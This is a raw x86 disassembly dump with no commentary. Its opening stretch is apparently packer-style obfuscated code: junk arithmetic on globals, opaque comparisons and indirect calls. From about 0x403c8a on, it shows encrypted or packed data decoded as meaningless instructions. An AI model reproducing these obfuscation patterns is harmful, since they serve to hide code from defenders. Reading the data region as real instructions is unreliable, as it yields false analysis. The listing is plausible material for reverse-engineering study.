  40390a:	sbb    ecx,DWORD PTR ds:0x42e020
  403910:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  403917:	mov    ecx,DWORD PTR ds:0x432000
  40391d:	and    DWORD PTR ds:0x42f01c,ecx
  403923:	mov    ecx,DWORD PTR [ebp-0x4]
  403926:	mov    ebx,0x7510891
  40392b:	xor    ecx,ebx
  40392d:	mov    eax,ds:0x41c37b
  403932:	mov    eax,DWORD PTR [eax]
  403934:	sub    DWORD PTR ds:0x430004,eax
  40393a:	mov    eax,0x3272d9
  40393f:	add    ecx,eax
  403941:	xor    DWORD PTR ds:0x42e00c,0x432010
  40394b:	mov    DWORD PTR [ebp-0x1c],ecx
  40394e:	xor    ecx,DWORD PTR ds:0x430008
  403954:	mov    ecx,DWORD PTR [ebp+0x14]
  403957:	sbb    DWORD PTR ds:0x42e00c,0x43000c
  403961:	test   ecx,ecx
  403963:	je     0x403977
  403969:	mov    ecx,DWORD PTR [ebp+0x14]
  40396c:	sub    DWORD PTR ds:0x432000,edx
  403972:	mov    ecx,DWORD PTR [ecx]
  403974:	mov    DWORD PTR [ebp-0x1c],ecx
  403977:	mov    ecx,0x457a
  40397c:	adc    esi,edi
  40397e:	imul   edx,eax
  403981:	adc    DWORD PTR ds:0x42e00c,0x363f
  40398b:	mov    esi,0x787f
  403990:	add    edx,ecx
  403992:	xchg   esi,ecx
  403994:	movzx  edi,WORD PTR ds:0x430004
  40399b:	sub    DWORD PTR ds:0x42f000,edi
  4039a1:	mov    edi,0x155c
  4039a6:	sub    edx,edi
  4039a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4039ab:	xor    ecx,ebx
  4039ad:	or     esi,0x7816
  4039b3:	add    ecx,eax
  4039b5:	dec    esi
  4039b6:	mov    DWORD PTR [ebp-0x8],ecx
  4039b9:	adc    DWORD PTR ds:0x432004,0x812
  4039c3:	mov    ecx,DWORD PTR [ebp-0x14]
  4039c6:	and    DWORD PTR ds:0x430004,edi
  4039cc:	xor    ecx,ebx
  4039ce:	sub    DWORD PTR ds:0x42f008,0x6246
  4039d8:	add    ecx,eax
  4039da:	and    esi,DWORD PTR ds:0x43101c
  4039e0:	mov    DWORD PTR [ebp-0x24],ecx
  4039e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4039e6:	xor    DWORD PTR ds:0x431010,ebx
  4039ec:	xor    ecx,ebx
  4039ee:	xor    DWORD PTR ds:0x43201c,0x355e
  4039f8:	add    ecx,eax
  4039fa:	mov    DWORD PTR [ebp-0x30],ecx
  4039fd:	mov    esi,DWORD PTR [ebp-0x4]
  403a00:	xor    esi,ebx
  403a02:	or     DWORD PTR ds:0x431004,0x12
  403a0c:	add    esi,eax
  403a0e:	inc    ecx
  403a0f:	mov    ecx,DWORD PTR [ebp-0x24]
  403a12:	sub    ecx,eax
  403a14:	lea    edx,[esi-0x3272d9]
  403a1a:	xor    DWORD PTR ds:0x432000,0x43100c
  403a24:	xor    ecx,ebx
  403a26:	and    DWORD PTR ds:0x43100c,0x6fb6
  403a30:	xor    edx,ebx
  403a32:	cmp    edx,ecx
  403a34:	mov    DWORD PTR ds:0x432010,0xf99
  403a3e:	je     0x40606c
  403a44:	not    ecx
  403a46:	mov    ecx,DWORD PTR [ebp-0x4]
  403a49:	xor    ecx,ebx
  403a4b:	adc    DWORD PTR ds:0x42f01c,0x2d24
  403a55:	add    ecx,eax
  403a57:	mov    DWORD PTR ds:0x430000,0x4418
  403a61:	cmp    esi,ecx
  403a63:	mov    DWORD PTR ds:0x432018,0x3819
  403a6d:	jne    0x406015
  403a73:	not    DWORD PTR ds:0x431010
  403a79:	push   DWORD PTR [ebp+0x8]
  403a7c:	and    DWORD PTR ds:0x42f008,0x42e004
  403a86:	call   0x4065ed
  403a8b:	sbb    ecx,edi
  403a8d:	mov    DWORD PTR [ebp-0x18],eax
  403a90:	adc    DWORD PTR ds:0x42f004,0x804
  403a9a:	mov    eax,DWORD PTR [ebp-0x4]
  403a9d:	sub    edi,DWORD PTR ds:0x432014
  403aa3:	mov    ecx,DWORD PTR [ebp-0x18]
  403aa6:	mov    edi,DWORD PTR ds:0x42f018
  403aac:	and    DWORD PTR ds:0x431004,edi
  403ab2:	xor    eax,ebx
  403ab4:	sbb    DWORD PTR ds:0x42e010,0x20e6
  403abe:	mov    edi,0x3272d9
  403ac3:	add    eax,edi
  403ac5:	mov    DWORD PTR ds:0x430000,0x1dc1
  403acf:	cmp    ecx,eax
  403ad1:	mov    DWORD PTR ds:0x43000c,0x1b04
  403adb:	je     0x4061d2
  403ae1:	push   DWORD PTR [ebp-0x18]
  403ae4:	push   DWORD PTR [ebp+0x8]
  403ae7:	add    DWORD PTR ds:0x42e020,0x432014
  403af1:	call   0x412740
  403af6:	mov    DWORD PTR [ebp-0x18],eax
  403af9:	or     eax,DWORD PTR ds:0x42e008
  403aff:	mov    eax,DWORD PTR [ebp-0x4]
  403b02:	and    DWORD PTR ds:0x430014,0x0
  403b0c:	jmp    0x403b1e
  403b11:	mov    ecx,DWORD PTR ds:0x430014
  403b17:	inc    ecx
  403b18:	mov    DWORD PTR ds:0x430014,ecx
  403b1e:	cmp    DWORD PTR ds:0x430014,0x1f
  403b25:	jae    0x403b48
  403b2b:	cmp    DWORD PTR ds:0x430014,0x21
  403b32:	jne    0x403b43
  403b38:	push   0x431018
  403b3d:	call   DWORD PTR ds:0x42a038
  403b43:	jmp    0x403b11
  403b48:	mov    ecx,DWORD PTR [ebp-0x18]
  403b4b:	add    DWORD PTR ds:0x432004,0x42f01c
  403b55:	xor    eax,ebx
  403b57:	add    eax,edi
  403b59:	cmp    ecx,eax
  403b5b:	mov    DWORD PTR ds:0x430008,0x3465
  403b65:	je     0x4061d2
  403b6b:	mov    eax,DWORD PTR [ebp-0x18]
  403b6e:	and    DWORD PTR ds:0x430000,ebx
  403b74:	mov    eax,DWORD PTR [eax+0x18]
  403b77:	mov    DWORD PTR [ebp-0x24],eax
  403b7a:	mov    DWORD PTR ds:0x42e01c,0x7537
  403b84:	mov    eax,DWORD PTR [ebp-0x18]
  403b87:	mov    ecx,DWORD PTR [ebp+0x8]
  403b8a:	sbb    DWORD PTR ds:0x42f018,0x42f00c
  403b94:	add    ecx,DWORD PTR [eax+0x20]
  403b97:	xor    eax,eax
  403b99:	or     eax,DWORD PTR ds:0x430018
  403b9f:	sub    DWORD PTR ds:0x42e01c,eax
  403ba5:	mov    DWORD PTR [ebp-0x2c],ecx
  403ba8:	mov    eax,DWORD PTR [ebp-0x18]
  403bab:	mov    ecx,DWORD PTR [ebp+0x8]
  403bae:	add    DWORD PTR ds:0x42f014,0x432000
  403bb8:	add    ecx,DWORD PTR [eax+0x24]
  403bbb:	mov    DWORD PTR ds:0x42f008,0x15
  403bc5:	cmp    DWORD PTR ds:0x42f008,0x0
  403bcc:	je     0x403c21
  403bd2:	cmp    DWORD PTR ds:0x42f008,0xb
  403bd9:	jne    0x403bf0
  403bdf:	push   DWORD PTR [ebp-0x28]
  403be2:	push   0x4521
  403be7:	push   DWORD PTR [ebp-0xc]
  403bea:	call   DWORD PTR ds:0x42a03c
  403bf0:	cmp    DWORD PTR ds:0x42f008,0xc
  403bf7:	jne    0x403c08
  403bfd:	mov    eax,ds:0x42f008
  403c02:	dec    eax
  403c03:	mov    ds:0x42f008,eax
  403c08:	xor    eax,eax
  403c0a:	add    eax,DWORD PTR ds:0x42f008
  403c10:	dec    eax
  403c11:	mov    ds:0x42f008,eax
  403c16:	jmp    0x403bc5
  403c1b:	sub    DWORD PTR ds:0x432008,edi
  403c21:	mov    DWORD PTR [ebp-0x34],ecx
  403c24:	and    DWORD PTR ds:0x42f00c,0x0
  403c2e:	jmp    0x403c3e
  403c33:	mov    eax,ds:0x42f00c
  403c38:	inc    eax
  403c39:	mov    ds:0x42f00c,eax
  403c3e:	cmp    DWORD PTR ds:0x42f00c,0x18
  403c45:	jae    0x403c7f
  403c4b:	cmp    DWORD PTR ds:0x42f00c,0x6
  403c52:	jne    0x403c61
  403c58:	push   DWORD PTR [ebp-0x1c]
  403c5b:	call   DWORD PTR ds:0x42a040
  403c61:	cmp    DWORD PTR ds:0x42f00c,0x5
  403c68:	jne    0x403c79
  403c6e:	mov    eax,ds:0x42f00c
  403c73:	inc    eax
  403c74:	mov    ds:0x42f00c,eax
  403c79:	jmp    0x403c33
  403c7e:	dec    ecx
  403c7f:	mov    eax,DWORD PTR [ebp-0x18]
  403c82:	mov    ecx,DWORD PTR [ebp+0x8]
  403c85:	jmp    0x405ff8
  403c8a:	scas   al,BYTE PTR es:[edi]
  403c8b:	bound  ebp,QWORD PTR [ecx+0x6ae365e3]
  403c91:	arpl   WORD PTR [esp+eax*4-0x21],cx
  403c95:	jae    0x403c5c
  403c97:	push   ss
  403c98:	ret    0xc58e
  403c9b:	pop    edi
  403c9c:	pusha  
  403c9d:	pusha  
  403c9e:	or     bl,BYTE PTR [edi+0x60]
  403ca1:	pusha  
  403ca2:	(bad)  
  403ca3:	or     al,0xea
  403ca5:	gs lahf 
  403ca7:	repnz sub bh,BYTE PTR [esi+ebp*1+0x57d926bc]
  403caf:	sbb    BYTE PTR [ecx],ch
  403cb1:	sbb    al,0x78
  403cb3:	cmp    al,0xfd
  403cb5:	dec    eax
  403cb6:	xchg   DWORD PTR [ebx+0x50],edx
  403cb9:	xchg   ecx,eax
  403cba:	call   0x18c9ab66
  403cbf:	push   ecx
  403cc0:	mov    ebp,fs
  403cc2:	inc    ebx
  403cc3:	stc    
  403cc4:	mov    ch,0xd4
  403cc6:	adc    BYTE PTR [ecx],bl
  403cc8:	push   ebx
  403cc9:	and    bl,bh
  403ccb:	mov    bh,dh
  403ccd:	or     dh,ch
  403ccf:	cwde   
  403cd0:	jge    0x403d0d
  403cd2:	shl    DWORD PTR [esi],0xcc
  403cd5:	push   ds
  403cd6:	push   cs
  403cd7:	pop    ecx
  403cd8:	ins    BYTE PTR es:[edi],dx
  403cd9:	xor    eax,0xdbc986ca
  403cde:	mov    ebp,0x1f2c78b7
  403ce3:	fmul   DWORD PTR [edx]
  403ce5:	pusha  
  403ce6:	xchg   BYTE PTR [ebx+0x1297ad15],bl
  403cec:	mov    esi,edi
  403cee:	or     BYTE PTR [esi-0x1a],ah
  403cf1:	fnsetpm(287 only) 
  403cf3:	mov    ebp,0x11fcb61b
  403cf8:	mov    eax,ds:0xedad7c63
  403cfd:	push   esp
  403cfe:	pop    esp
  403cff:	dec    eax
  403d00:	sti    
  403d01:	in     al,0xef
  403d03:	lods   al,BYTE PTR ds:[esi]
  403d04:	mov    bl,0xa3
  403d06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d07:	xor    al,0xdd
  403d09:	adc    dl,ah
  403d0b:	inc    eax
  403d0c:	fimul  WORD PTR [esi-0x68]
  403d0f:	push   edx
  403d10:	sub    eax,0x95d31c0b
  403d15:	ds leave 
  403d17:	jle    0x403d33
  403d19:	enter  0xf758,0x42
  403d1d:	adc    eax,0x9fb06541
  403d22:	mov    eax,ds:0xdb4d39fa
  403d27:	push   ebx
  403d28:	sbb    al,BYTE PTR [edx+0x11]
  403d2b:	scas   eax,DWORD PTR es:[edi]
  403d2c:	push   edi
  403d2d:	icebp  
  403d2e:	jo     0x403cd3
  403d30:	aad    0xb8
  403d32:	adc    dh,bh
  403d34:	cmp    eax,0xbc615ca
  403d39:	ret    0x5f3b
  403d3c:	lea    esi,[edx-0x76c2407e]
  403d42:	repz sahf 
  403d44:	pop    ebp
  403d45:	dec    ebp
  403d46:	adc    DWORD PTR [esi+0x22],edx
  403d49:	pop    ss
  403d4a:	stos   DWORD PTR es:[edi],eax
  403d4b:	sub    DWORD PTR [edi+0x69],ecx
  403d4e:	aas    
  403d4f:	and    cl,BYTE PTR [ebx-0xa]
  403d52:	cmp    eax,0x67c5f1fd
  403d57:	dec    eax
  403d58:	(bad)
  403d5b:	adc    ebp,esp
  403d5d:	fcom   DWORD PTR [eax]
  403d5f:	jne    0x403cf9
  403d61:	js     0x403d95
  403d63:	cli    
  403d64:	pop    ebx
  403d65:	pop    edi
  403d66:	lea    ebp,[edi]
  403d68:	push   ebx
  403d69:	dec    esp
  403d6a:	fsub   DWORD PTR [esi-0x41898111]
  403d70:	pop    ds
  403d71:	jns    0x403da1
  403d73:	jmp    0x62e0b39b
  403d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d79:	adc    DWORD PTR [ebp+0x15],ebp
  403d7c:	imul   ebx,DWORD PTR [ecx],0x4a
  403d7f:	and    ebx,DWORD PTR [edx]
  403d81:	push   edi
  403d82:	aam    0x5
  403d84:	cmp    dh,ah
  403d86:	sar    DWORD PTR [eax+0x9f5eba3],0xc0
  403d8d:	shl    DWORD PTR [ebx-0x46],cl
  403d90:	adc    al,0xc3
  403d92:	shr    BYTE PTR ds:0x81c62100,cl
  403d98:	dec    edx
  403d99:	rcr    ebp,1
  403d9b:	call   DWORD PTR [ecx-0x547826b3]
  403da1:	jmp    0x84dbee5a
  403da6:	pop    ds
  403da7:	test   eax,0x4b8f7b5f
  403dac:	stos   DWORD PTR es:[edi],eax
  403dad:	ret    
  403dae:	int    0x23
  403db0:	test   al,0x9b
  403db2:	xlat   BYTE PTR ds:[ebx]
  403db3:	arpl   WORD PTR [edi],bp
  403db5:	jbe    0x403e11
  403db7:	repz or ah,BYTE PTR ds:0x25e1abd2
  403dbe:	(bad)  
  403dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dc0:	mov    edx,0x3304f01c
  403dc5:	lods   eax,DWORD PTR ds:[esi]
  403dc6:	aad    0x70
  403dc8:	cmp    BYTE PTR [eax+0x1e],cl
  403dcb:	stc    
  403dcc:	xor    ecx,DWORD PTR [edi+ecx*4+0x55]
  403dd0:	push   ebp
  403dd1:	and    DWORD PTR [esi+0x3e0e3df8],0x67
  403dd8:	imul   eax,DWORD PTR [edi-0x53],0x72
  403ddc:	mov    edx,DWORD PTR [eax-0x51]
  403ddf:	clc    
  403de0:	xchg   ecx,eax
  403de1:	std    
  403de2:	pop    ecx
  403de3:	xchg   edx,eax
  403de4:	hlt    
  403de5:	pusha  
  403de6:	scas   eax,DWORD PTR es:[edi]
  403de7:	ds stc 
  403de9:	pop    esp
  403dea:	and    DWORD PTR [edi+0x22],ecx
  403ded:	test   BYTE PTR ds:0x107eeef7,0xc5
  403df4:	dec    edx
  403df5:	jmp    0x403d7c
  403df7:	mov    ds,esp
  403df9:	inc    esi
  403dfa:	fcom   DWORD PTR ds:0xe448fd79
  403e00:	std    
  403e01:	jmp    0x5b59:0x47d4117d
  403e08:	sti    
  403e09:	inc    esp
  403e0a:	dec    ebp
  403e0b:	inc    esi
  403e0c:	cwde   
  403e0d:	out    dx,al
  403e0e:	(bad)  
  403e0f:	xchg   esi,eax
  403e10:	xor    DWORD PTR [esi],esp
  403e12:	(bad)  
  403e13:	mov    DWORD PTR [edi-0x32812440],edx
  403e19:	fistp  WORD PTR [eax+0x73ce12fa]
  403e1f:	outs   dx,BYTE PTR ds:[esi]
  403e20:	iret   
  403e21:	arpl   WORD PTR [eax+0x3a],bx
  403e24:	nop
  403e25:	popa   
  403e26:	popa   
  403e27:	xchg   ebx,eax
  403e28:	iret   
  403e29:	rol    DWORD PTR [ebx+0x53b35816],0x95
  403e30:	cli    
  403e31:	dec    esi
  403e32:	sbb    dl,ch
  403e34:	mov    bh,0xc3
  403e36:	adc    BYTE PTR ds:0x95a8e218,cl
  403e3c:	ss push esp
  403e3e:	ins    DWORD PTR es:[edi],dx
  403e3f:	les    esi,FWORD PTR [esi-0x72]
  403e42:	nop
  403e43:	add    dl,al
  403e45:	or     al,0xd9
  403e47:	lds    ecx,FWORD PTR [eax+0x703183c]
  403e4d:	pop    ds
  403e4e:	outs   dx,DWORD PTR ds:[esi]
  403e4f:	loop   0x403ead
  403e51:	pop    esp
  403e52:	xchg   DWORD PTR ss:[eax+0x6740adf0],edx
  403e59:	jle    0x403ec1
  403e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5c:	ja     0x403e51
  403e5e:	psrld  mm6,QWORD PTR [ebp+0x7dba6b1e]
  403e65:	xchg   ebx,eax
  403e66:	ret    0xd0d
  403e69:	push   esi
  403e6a:	dec    eax
  403e6b:	fdiv   DWORD PTR [ecx]
  403e6d:	shl    edi,cl
  403e6f:	test   DWORD PTR ds:0x22f258ff,edi
  403e75:	shr    BYTE PTR [ebx],1
  403e77:	push   es
  403e78:	retf   
  403e79:	loope  0x403e46
  403e7b:	nop
  403e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e7d:	fsub   DWORD PTR cs:[eax]
  403e80:	jmp    FWORD PTR [ecx+0x494aea26]
  403e86:	mov    ebx,0xba87b98a
  403e8b:	cmp    eax,0xc37b3387
  403e90:	scas   al,BYTE PTR es:[edi]
  403e91:	ins    DWORD PTR es:[edi],dx
  403e92:	fwait
  403e93:	cmc    
  403e94:	int    0xd3
  403e96:	clc    
  403e97:	gs lahf 
  403e99:	in     eax,0xb2
  403e9b:	push   ds
  403e9c:	test   eax,0x795a3911
  403ea1:	jle    0x403ef3
  403ea3:	imul   ecx,ebx,0x108e1efa
  403ea9:	arpl   cx,di
  403eab:	retf   0x6ea5
  403eae:	hlt    
  403eaf:	retf   0xa625
  403eb2:	cmc    
  403eb3:	mov    esi,0x71749407
  403eb8:	inc    edx
  403eb9:	jmp    0x498c04c
  403ebe:	jl     0x403e43
  403ec0:	ret    0x90fd
  403ec3:	push   eax
  403ec4:	sbb    eax,0x131943fd
  403ec9:	in     al,dx
  403eca:	(bad)  
  403ecb:	sub    DWORD PTR [ecx+0x40],edi
  403ece:	imul   ebx,ebx,0xffffff84
  403ed1:	inc    ebx
  403ed2:	push   cs
  403ed3:	mov    BYTE PTR [esi+0x51eabd0],al
  403ed9:	lahf   
  403eda:	test   al,0x73
  403edc:	mul    BYTE PTR [ecx-0x5]
  403edf:	push   ss
  403ee0:	push   ss
  403ee1:	ror    BYTE PTR [ebx],1
  403ee3:	cmp    al,0x66
  403ee5:	mov    BYTE PTR [ebx-0x5f25b359],dl
  403eeb:	xchg   ch,cl
  403eed:	pop    es
  403eee:	into   
  403eef:	add    al,0xac
  403ef1:	sub    ebx,esi
  403ef3:	xchg   DWORD PTR [ecx-0x7849c582],ebx
  403ef9:	lods   al,BYTE PTR ds:[esi]
  403efa:	add    al,BYTE PTR [esi]
  403efc:	add    BYTE PTR [ecx],ch
  403efe:	sub    esi,DWORD PTR [ecx+0x40]
  403f01:	push   esi
  403f02:	ficom  WORD PTR [ebx+0x61]
  403f05:	mov    ecx,0x36cee238
  403f0a:	shl    BYTE PTR [ebx+0x73],0xa4
  403f0e:	add    esp,edi
  403f10:	add    ch,BYTE PTR [eax-0x7e5216a6]
  403f16:	rcr    BYTE PTR [esi-0x38],1
  403f19:	imul   ebp,esp,0x8a6746f9
  403f1f:	mov    bl,0x47
  403f21:	adc    ch,BYTE PTR [ebx]
  403f23:	sbb    al,0x4c
  403f25:	(bad)  
  403f26:	in     al,0xb
  403f28:	mov    dh,0x10
  403f2a:	or     eax,0xe33f9d52
  403f2f:	push   edx
  403f30:	push   ebp
  403f31:	mov    BYTE PTR [edx-0x4cee644a],bh
  403f37:	clc    
  403f38:	test   eax,0xecbf2ce4
  403f3d:	rol    DWORD PTR [ecx+0x1d],0xa0
  403f41:	ficomp DWORD PTR ds:0x4f03d98b
  403f47:	call   0x87e7:0xc85239ce
  403f4e:	int    0x1b
  403f50:	scas   eax,DWORD PTR es:[edi]
  403f51:	pop    esi
  403f52:	inc    edx
  403f53:	xchg   edi,eax
  403f54:	cld    
  403f55:	xchg   edi,eax
  403f56:	scas   eax,DWORD PTR es:[edi]
  403f57:	inc    eax
  403f58:	jns    0x403f99
  403f5a:	dec    ebp
  403f5b:	int3   
  403f5c:	add    eax,0xe0430c23
  403f61:	sub    BYTE PTR [esp+edx*1+0xe3f9655],al
  403f68:	inc    ebp
  403f69:	fcmove st,st(7)
  403f6b:	push   ecx
  403f6c:	mov    ds:0x3b2e842e,eax
  403f71:	bound  ebx,QWORD PTR [ecx-0x2ba9a52b]
  403f77:	loopne 0x403fb0
  403f79:	pop    edi
  403f7a:	fmul   st,st(2)
  403f7c:	mov    ah,0xad
  403f7e:	retf   
  403f7f:	mov    al,0x5f
  403f81:	lods   eax,DWORD PTR ds:[esi]
  403f82:	mov    bl,0xb0
  403f84:	es cli 
  403f86:	cmc    
  403f87:	mov    ?,WORD PTR cs:[edi+0x3bdfb209]
  403f8e:	shl    BYTE PTR [ebp+ebp*4+0x4fdeea73],cl
  403f95:	fdiv   QWORD PTR [edx+ebx*2]
  403f98:	in     eax,dx
  403f99:	mov    dl,0x81
  403f9b:	stos   BYTE PTR es:[edi],al
  403f9c:	xor    eax,0x132686fb
  403fa1:	out    0xc2,eax
  403fa3:	call   0x4de1:0x199d9f7f
  403faa:	cmc    
  403fab:	cmp    dh,BYTE PTR ds:0xa8b5c8
  403fb1:	in     eax,0xfa
  403fb3:	fstp   TBYTE PTR [edi-0x2f526342]
  403fb9:	jle    0x40402d
  403fbb:	das    
  403fbc:	dec    ebx
  403fbd:	push   0xffffffe3
  403fbf:	push   edi
  403fc0:	(bad)  
  403fc1:	jecxz  0x404032
  403fc3:	cli    
  403fc4:	and    cl,BYTE PTR [ebx]
  403fc6:	nop
  403fc7:	cdq    
  403fc8:	test   al,0x24
  403fca:	(bad)  
  403fcb:	jg     0x404039
  403fcd:	mov    bl,BYTE PTR [ebx]
  403fcf:	pop    edx
  403fd0:	add    dl,BYTE PTR [edx+ecx*8-0x75b625dc]
  403fd7:	xor    eax,0x28aafa95
  403fdc:	sbb    ah,bh
  403fde:	scas   al,BYTE PTR es:[edi]
  403fdf:	xchg   ecx,eax
  403fe0:	out    dx,eax
  403fe1:	inc    esi
  403fe2:	aad    0x14
  403fe4:	aas    
  403fe5:	hlt    
  403fe6:	mov    edx,0xd7e4bba9
  403feb:	retf   0xc62f
  403fee:	add    edx,edi
  403ff0:	cmp    ch,bl
  403ff2:	or     al,0x76
  403ff4:	sahf   
  403ff5:	mov    esi,0xc43a3add
  403ffa:	lock jp 0x403fc7
  403ffd:	das    
  403ffe:	xchg   edi,eax
  403fff:	je     0x403fa8
  404001:	mov    esp,0xd1fde078
  404006:	push   ebx
  404007:	push   0xffffffbd
  404009:	ds test al,cl
  40400c:	mov    bl,BYTE PTR [eax-0x3d6006df]
  404012:	outs   dx,BYTE PTR ds:[esi]
  404013:	scas   eax,DWORD PTR es:[edi]
  404014:	lahf   
  404015:	add    al,0x79
  404017:	jp     0x403fee
  404019:	ja     0x404023
  40401b:	cli    
  40401c:	inc    edx
  40401d:	xchg   esi,eax
  40401e:	les    esi,FWORD PTR [esp+ebp*4+0x25]
  404022:	imul   ecx,ecx,0xe119832b
  404028:	dec    eax
  404029:	jmp    0x404091
  40402b:	aaa    
  40402c:	lea    ecx,[ebp-0xd]
  40402f:	sahf   
  404030:	push   edi
  404031:	push   edx
  404032:	leave  
  404033:	adc    al,BYTE PTR [ebx]
  404035:	mov    cl,0x79
  404037:	inc    ebp
  404038:	xor    ch,BYTE PTR [edi+0x16e4455]
  40403e:	iret   
  40403f:	sbb    BYTE PTR [ebx-0x2205d81f],bh
  404045:	jg     0x403fde
  404047:	dec    edx
  404048:	test   al,0xcd
  40404a:	mov    ds:0xfc37af21,eax
  40404f:	jg     0x4040b8
  404051:	and    BYTE PTR [ebx+0x20],bl
  404054:	les    ebx,FWORD PTR [edx+0x36]
  404057:	pop    es
  404058:	pop    edi
  404059:	cdq    
  40405a:	mov    ebx,0x332783d9
  40405f:	xor    DWORD PTR [eax],esi
  404061:	std    
  404062:	test   BYTE PTR [ecx+0x8],0xd7
  404066:	cmp    BYTE PTR [eax+0x71],0x3d
  40406a:	jmp    0x40409b
  40406c:	jg     0x404085
  40406e:	adc    BYTE PTR [eax],cl
  404070:	sahf   
  404071:	das    
  404072:	(bad)  
  404073:	mov    esp,0xb87985f1
  404078:	inc    edx
  404079:	push   edx
  40407a:	add    ebx,ecx
  40407c:	xor    eax,0xf1ab4fec
  404081:	fsincos 
  404083:	dec    ebx
  404084:	pop    ecx
  404085:	mov    edx,0xf8e40078
  40408a:	pop    ecx
  40408b:	in     eax,0x33
  40408d:	(bad)  
  40408e:	add    BYTE PTR [esi+eiz*8],0x8b
  404092:	pop    esp
  404093:	in     al,0x38
  404095:	(bad)  
  404096:	mov    edi,0x497fedbd
  40409b:	lea    esi,[edx+0x34]
  40409e:	mov    ecx,eax
  4040a0:	and    eax,0x973e49d0
  4040a5:	or     DWORD PTR [edi+0x2b],ebp
  4040a8:	aaa    
  4040a9:	retf   
  4040aa:	sbb    eax,0x95b9240f
  4040af:	dec    ebp
  4040b0:	xlat   BYTE PTR ds:[ebx]
  4040b1:	push   esp
  4040b2:	fs push edx
  4040b4:	inc    ebx
  4040b5:	stos   BYTE PTR es:[edi],al
  4040b6:	pop    ebx
  4040b7:	aas    
  4040b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040b9:	push   edi
  4040ba:	adc    esi,DWORD PTR [ebx-0x62]
  4040bd:	pop    esp
  4040be:	dec    esi
  4040bf:	pushf  
  4040c0:	pop    ecx
  4040c1:	jecxz  0x4040b5
  4040c3:	push   ds
  4040c4:	call   0x12c393bc
  4040c9:	xchg   edi,eax
  4040ca:	ins    BYTE PTR es:[edi],dx
  4040cb:	cmp    cl,BYTE PTR [ebp-0x80]
  4040ce:	mov    al,0xb0
  4040d0:	je     0x4040a3
  4040d2:	push   ebx
  4040d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040d4:	pop    ebp
  4040d5:	sub    eax,0x1dc55a6
  4040da:	fnstenv [edi+0x618ff4a0]
  4040e0:	xchg   ecx,eax
  4040e1:	cmp    ecx,ebp
  4040e3:	ja     0x404130
  4040e5:	mov    ds:0x84780a1f,al
  4040ea:	fidiv  WORD PTR [esp+ecx*2+0x25bd6907]
  4040f1:	dec    edx
  4040f2:	mov    ecx,DWORD PTR [esp+esi*1+0x2cbeb9bc]
  4040f9:	test   esp,ebp
  4040fb:	pop    esi
  4040fc:	popa   
  4040fd:	mov    eax,0x93a1c5bf
  404102:	pop    es
  404103:	repz ret 0x327f
  404107:	fistp  DWORD PTR [edx-0xc50b7fe]
  40410d:	mov    edi,0x8815ff48
  404112:	test   eax,esi
  404114:	dec    edx
  404115:	aad    0x62
  404117:	cmp    ebx,ebp
  404119:	and    dh,BYTE PTR [esi+0x51]
  40411c:	mov    edi,DWORD PTR [esi]
  40411e:	dec    ebp
  40411f:	lods   eax,DWORD PTR cs:[esi]
  404121:	std    
  404122:	adc    ebp,DWORD PTR [eax]
  404124:	sbb    al,0x26
  404126:	rcl    BYTE PTR [edi-0x44],cl
  404129:	add    ecx,DWORD PTR [esi+0x1e]
  40412c:	jb     0x4040f4
  40412e:	mov    DWORD PTR [eax-0x36260f5d],ebp
  404134:	ja     0x404135
  404136:	mov    ebp,0xdf3927a1
  40413b:	and    esp,ecx
  40413d:	mov    edx,0x251cd70c
  404142:	dec    edx
  404143:	mov    ebx,DWORD PTR [edx+0x51]
  404146:	jb     0x404149
  404148:	or     BYTE PTR [eax+0x1c98b953],bh
  40414e:	je     0x40410f
  404150:	dec    edx
  404151:	cmp    BYTE PTR [edx-0x74],bh
  404154:	add    al,0x64
  404156:	ror    BYTE PTR [ebx+eiz*1],1
  404159:	pop    ds
  40415a:	add    eax,0xff452c82
  40415f:	adc    BYTE PTR [eax+0x37ee2a14],bh
  404165:	jo     0x4040e8
  404167:	clc    
  404168:	dec    edx
  404169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40416a:	xor    BYTE PTR [edi+0x6808aecb],dh
  404170:	ss inc edx
  404172:	stos   DWORD PTR es:[edi],eax
  404173:	adc    al,0x95
  404175:	pop    edx
  404176:	inc    esi
  404177:	call   0xfec1:0xeb8eb4b
  40417e:	out    dx,eax
  40417f:	lahf   
  404180:	sub    DWORD PTR [ebx+0x7cba70ef],esp
  404186:	pop    ebx
  404187:	ds xor esp,ecx
  40418a:	test   eax,0x5d54ad24
  40418f:	aad    0x61
  404191:	cmp    edi,edx
  404193:	xor    al,0x16
  404195:	icebp  
  404196:	jecxz  0x40412f
  404198:	and    esi,DWORD PTR [edx+0x7e6ba833]
  40419e:	cli    
  40419f:	retf   0xc9f
  4041a2:	push   edx
  4041a3:	test   al,0x99
  4041a5:	nop
  4041a6:	sub    ebx,DWORD PTR [ecx+0x2ae0c153]
  4041ac:	shl    BYTE PTR [ecx+edx*4],1
  4041af:	icebp  
  4041b0:	pushf  
  4041b1:	push   edx
  4041b2:	(bad)  
  4041b3:	rol    cl,cl
  4041b5:	test   al,0x78
  4041b7:	out    dx,eax
  4041b8:	xor    cl,al
  4041ba:	pop    edx
  4041bb:	xor    ebx,DWORD PTR [esi+0x7a]
  4041be:	dec    eax
  4041bf:	lock mov BYTE PTR [edx],bh
  4041c2:	mov    edx,0xb6dfcae8
  4041c7:	sub    esp,DWORD PTR [esi+0x5a2b0f92]
  4041cd:	xor    BYTE PTR [ecx],0xd8
  4041d0:	call   0x2353:0x9f219f90
  4041d7:	fwait
  4041d8:	xor    eax,0x7854e7ec
  4041dd:	stos   BYTE PTR es:[edi],al
  4041de:	test   al,0xbf
  4041e0:	mov    bl,BYTE PTR [ecx]
  4041e2:	leave  
  4041e3:	push   esi
  4041e4:	xchg   esp,eax
  4041e5:	jnp    0x4041f7
  4041e7:	dec    ebp
  4041e8:	cmp    BYTE PTR [esi+0x59e23112],dl
  4041ee:	mov    edi,0x32bd60c3
  4041f3:	sbb    DWORD PTR [edx-0x1a],esp
